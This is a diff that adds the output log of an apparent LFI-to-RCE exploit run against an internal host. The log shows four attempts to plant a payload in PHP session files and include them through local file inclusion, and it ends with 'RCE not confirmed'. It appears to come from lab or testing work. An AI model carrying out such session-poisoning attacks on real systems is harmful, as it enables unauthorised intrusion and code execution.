@@ -1,0 +1,16 @@
+[*] Target: http://10.20.0.226:8091
+[*] Command: id
+
+[attempt 1] SID=exploitb5ab2df2903c4b1c86c2 file=/tmp/sess_exploitb5ab2df2903c4b1c86c2
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b''
+[attempt 2] SID=exploit9535312f6dd447ffb0ff file=/tmp/sess_exploit9535312f6dd447ffb0ff
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b''
+[attempt 3] SID=exploit8b6eefeaa90c4280a377 file=/tmp/sess_exploit8b6eefeaa90c4280a377
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b''
+[attempt 4] SID=exploit5b48f578eef64073b04c file=/tmp/sess_exploit5b48f578eef64073b04c
+    plant=HTTP/1.1 200 OK
+    lfi=HTTP/1.1 200 OK body=b''
+[-] RCE not confirmed — LFI path/session path or timing is wrong
